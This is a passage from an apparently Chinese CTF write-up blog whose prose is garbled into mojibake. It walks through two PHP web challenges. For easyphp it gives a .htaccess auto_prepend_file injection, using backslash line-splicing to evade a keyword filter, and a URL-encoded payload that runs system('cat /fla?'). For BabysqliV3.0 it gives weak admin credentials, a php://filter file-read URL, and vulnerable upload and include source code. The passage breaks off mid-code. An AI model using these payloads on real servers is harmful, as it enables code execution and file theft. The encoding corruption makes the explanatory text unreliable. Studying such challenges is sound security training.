<h1 id="122ã€-å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "><a href="#122ã€-å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="122ã€[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "></a>122ã€[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </h1><h1 id="123ã€-ç¾ŠåŸæ¯2020-easyphp"><a href="#123ã€-ç¾ŠåŸæ¯2020-easyphp" class="headerlink" title="123ã€[ç¾ŠåŸæ¯2020]easyphp"></a>123ã€[ç¾ŠåŸæ¯2020]easyphp</h1><p>ä¸€é“å…³äº.htaccessçš„é¢˜ç›® </p>
<p>ç»™äº†æºç ;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¤§è‡´æµè§ˆå°±æ˜¯å½“å‰ç›®å½•ä¸‹åªèƒ½å­˜åœ¨index.php å…¶ä»–æ–‡ä»¶éƒ½ä¼šè¢«åˆ é™¤ </p>
<p>ä½†æ˜¯è¿™é“é¢˜ç›®å¯ä»¥åˆ›å»ºå…¶ä»–æ–‡ä»¶åœ¨å½“å‰ç›®å½•ä¸‹ çœŸçš„ç¦»è°± ä¸è¿‡å†™å…¥ä¹Ÿæ²¡ç”¨ è¿™é“é¢˜ç›®åªå®¹è®¸index.phpè§£æ å…¶ä»–phpæ–‡ä»¶ä»£ç éƒ½æ˜¯åŸæ ·è¾“å‡º ä¸ä¼šè§£æçš„</p>
<p>ç„¶åè¿™é“é¢˜ç›®è¦åˆ©ç”¨.htaccess è¿™æ˜¯ä¸€ä¸ªphpé…ç½®æ–‡ä»¶ é‚£ä¹ˆä¸ºä»€ä¹ˆä¸ç”¨.user.iniå‘¢</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920107307-9ef4226b-6c09-496c-a88a-9e74d6abd4e4.png" alt="img"></p>
<p>å› ä¸º.htaccessæ–‡ä»¶ä½œç”¨çš„èŒƒå›´æ›´å¤§  å®ƒæ¯”è¾ƒçµæ´»ï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ï¼Œä¹Ÿä¸éœ€è¦ç®¡ç†å‘˜æƒé™  </p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920342664-afd98b25-24e8-43c4-9bec-4f10ce93dd4b.png" alt="img"></p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920296884-1a0e4198-a879-4cb9-9477-c73e849b53c9.png" alt="img"></p>
<p>æˆ‘ä»¬å¯ä»¥ç”Ÿæˆä¸€ä¸ª.htaccessæ–‡ä»¶å»é…ç½®æ–‡ä»¶åŒ…å« </p>
<p>è¿™æ ·åœ¨æ¯ä¸ªphpæ–‡ä»¶ä¸­éƒ½åŒ…å«ä¸€ä¸ª.htaccessæ–‡ä»¶ æœ‰ç‚¹å¥—å¨ƒçš„æ„Ÿè§‰</p>
<p>å¹¶ä¸”æˆ‘ä»¬åœ¨.htaccessæ–‡ä»¶ä¸­ä»¥æ³¨é‡Šæ–¹æ³•å†™ä¸Šæˆ‘ä»¬çš„æ¶æ„ä»£ç  è¿™æ ·å°±ä¸ä¼šå½±å“æˆ‘ä»¬çš„.htaccessæ–‡ä»¶æ­£å¸¸è¿è¡Œäº†</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920490507-9295d8b4-8c6b-4185-9555-4a339bbc66f1.png" alt="img"></p>
<p>æ‰€ä»¥å†…å®¹ä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ ¹æ®æºç  fileè¢«wafäº† </p>
<p>ä½†æ˜¯å¯ä»¥ç”¨<code>\</code>æ¥æ‹¼æ¥ä¸Šä¸‹è¡Œ æˆ‘åœ¨ä¸Šé¢ä¹Ÿè¯´åˆ°äº†</p>
<p>æ‰€ä»¥æ”¹ä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_f\</span><br><span class="line">ile .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¹¶ä¸”</p>
<p><code>file_put_contents($filename, $content . &quot;\nHello, world&quot;);</code>ä¼šåœ¨åé¢åŠ ä¸Šæ²¡æ„ä¹‰çš„å†…å®¹ å½±å“æˆ‘ä»¬çš„.htaccessæ–‡ä»¶æ­£å¸¸æ‰§è¡Œ æ‰€ä»¥å†åŠ ä¸€ä¸ª<code>\</code>è½¬ä¹‰æ‰<code>\n</code>ä¸è®©ä»–æ¢è¡Œ</p>
<p>è¿™æ ·æ‹¼æ¥çš„å†…å®¹å°±å˜ä¸º<code>\\nHello, world</code>äº†</p>
<p>æ‰€ä»¥æœ€payloadå½¢å¼:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_f\</span><br><span class="line">ile .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();?&gt;\</span></span><br><span class="line">?filename=.htaccess&amp;content=php_value%<span class="number">20</span>auto_prepend_f%<span class="number">5</span>C%<span class="number">0</span>Aile%<span class="number">20</span>.htaccess%<span class="number">0</span>A%<span class="number">23</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system(<span class="string">&#x27;cat%20%2Ffla%3F&#x27;</span>)%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">5</span>C</span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689921496468-5989a398-9503-40ac-9ab4-563419de6dfb.png" alt="img"></p>
<p>å…¶å®ä¸€å¼€å§‹æˆ‘æœ‰ä¸ªé—®é¢˜å°±æ˜¯ <code>#&lt;?php phpinfo();?&gt;\</code>è¢«åŒ…å«åœ¨index.phpä¸­ å‰é¢ä¸æ˜¯æœ‰ä¸ª<code>#</code>å— </p>
<p><code>#</code>åœ¨phpä¸­ä¹Ÿæ˜¯å•è¡Œæ³¨é‡Šç¬¦ ä¸ºä»€ä¹ˆä¼šæ‰§è¡Œè¿™ä¸€è¡Œå‘¢ ï¼Ÿ</p>
<p>å…¶å®#æ ¹æœ¬å°±ä¸åœ¨phpä»£ç å†…å®¹ä¸­ ä¹Ÿå°±æ˜¯ä¸åœ¨phpä»£ç <code>&lt;?php ?&gt;</code>ä¸­ ä¸ä¼šå½“ä½œæ³¨é‡Šç¬¦ åªæœ‰åœ¨<code>&lt;?php ?&gt;</code>é‡Œé¢æ‰ä¼šè¢«å½“ä½œæ³¨é‡Šç¬¦</p>
<p>ä¸€ä¸‹demoç®€å•ç†è§£</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689921829164-36d8fada-eb71-4646-8c59-c4ba49d8b785.png" alt="img"></p>
<h1 id="124ã€-GXYCTF2019-BabysqliV3-0"><a href="#124ã€-GXYCTF2019-BabysqliV3-0" class="headerlink" title="124ã€[GXYCTF2019]BabysqliV3.0"></a>124ã€[GXYCTF2019]BabysqliV3.0</h1><p>è¿™é“é¢˜ç›®çœ‹æ ‡é¢˜ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ ä½†æ˜¯å…¶å®é¢„æœŸè§£æ˜¯pharååºåˆ—åŒ– æœ€é‡è¦çš„æ˜¯ä»£ç å®¡è®¡</p>
<p>å¼±å£ä»¤ admin/password</p>
<p>çœ‹url å¾ˆå¥‡æ€ª æ„Ÿè§‰å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home.php?file=php://filter/read=convert.base64-encode/resource=upload</span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$sandbox</span> = <span class="title function_ invoke__">getcwd</span>().<span class="string">&quot;/uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (â€²â–½`ã€ƒ)&#x27;);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line">        <span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line">    <span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>home.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/home$/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/upload$/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">				<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;å½“å‰å¼•ç”¨çš„æ˜¯ &quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">			<span class="keyword">require</span> <span class="variable">$file</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;no permission!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h2><p>ä»£ç å®¡è®¡ ä»£ç å®¡è®¡å¤ªé‡è¦äº† </p>
<p>æˆ‘ä»¬å…ˆæ­£å¸¸ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689928467956-3270cb40-1179-4a4e-b07c-0830b11f0a61.png" alt="img"></p>
<p>çˆ†å‡ºäº†ä¿å­˜è·¯å¾„ å¹¶ä¸”ä»–ç›´æ¥æ˜¾ç¤ºå‡ºäº†æˆ‘ä»¬çš„å†…å®¹GIF89aï¼Ÿï¼Ÿï¼Ÿï¼Ÿ ä½†æ˜¯æˆ‘ä»¬çš„æ–‡ä»¶åç¼€å·²ç»è¢«æ”¹ä¸ºäº†txt æ‰€ä»¥æˆ‘ä»¬çš„phpä»£ç æ— æ³•æ‰§è¡Œ</p>
<p>çœ‹çœ‹ä¸ºä»€ä¹ˆä¼šç›´æ¥è¾“å‡ºçš„ä»£ç é€»è¾‘ï¼Œå¯è§æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶å ä¼šç«‹å³å°†æ–‡ä»¶ç»è¿‡å¤„ç†ä¹‹åè¾“å‡º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line">    <span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†æ¥çœ‹è¿™ä¸€éƒ¨åˆ† ç»å…¸åˆ›å»ºä¸€ä¸ªæ²™ç›’ </p>
<p>å¹¶ä¸”æ³¨æ„åˆ°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">     <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>nameæˆ‘ä»¬å¯æ§ å¦‚æœæˆ‘ä»¬getä¸€ä¸ªnameå¹¶ä¸”ä¸åŒ…å«ä»–æ­£åˆ™çš„ä¼ªåè®®å­—ç¬¦ é‚£ä¹ˆå°±ä¸ä¼šè¢«ä»–ä¿®æ”¹æ–‡ä»¶å</p>
<p>å¦‚æœæ²¡æœ‰è®¾ç½®æˆ–è€…åŒ…å«ä»–æ­£åˆ™çš„å­—ç¬¦</p>
<p>æˆ‘ä»¬æ–‡ä»¶åæ”¹ä¸º<code>$sandbox.$_SESSION[&#39;user&#39;].$ext;</code> å¾ˆç¬¦åˆ<code>/var/www/html/uploads/f07f07f4e21adb2dbae6c57907a6b22c/GXY7ee46e116c49b534d9932a9999994865.txt</code>æ¸…æ™°æ˜äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">getcwd</span>().<span class="string">&quot;/uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    <span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span 